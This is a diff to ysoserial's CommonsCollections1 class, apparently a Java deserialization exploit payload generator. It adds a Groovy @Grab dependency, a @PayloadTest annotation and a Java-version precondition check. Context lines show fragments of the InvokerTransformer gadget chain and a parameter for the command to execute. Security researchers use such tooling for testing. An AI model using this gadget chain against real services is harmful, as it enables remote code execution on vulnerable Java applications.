@@ -10,12 +10,15 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
+import groovy.lang.Grab;
 import ysoserial.annotation.Bind;
 import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
+import ysoserial.payloads.util.Version;
 
 /*
 	Gadget chain:	
@@ -40,7 +43,9 @@ import ysoserial.payloads.util.Reflections;
 		commons-collections
  */
 @SuppressWarnings({"rawtypes", "unchecked"})
+@Grab( "commons-collections:commons-collections:3.1" )
 @Dependencies({"commons-collections:commons-collections:3.1"})
+@PayloadTest( precondition = "testCheckJavaVersion" )
 public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 	
 	@Bind( helpText = "The command to execute" )
@@ -99,6 +104,10 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
 				
 		return handler;
+	}
+	
+	public static Boolean testCheckJavaVersion() { 
+		return Version.allowsDefaultAIH();
 	}
 	
 	public static void main(final String[] args) throws Exception {
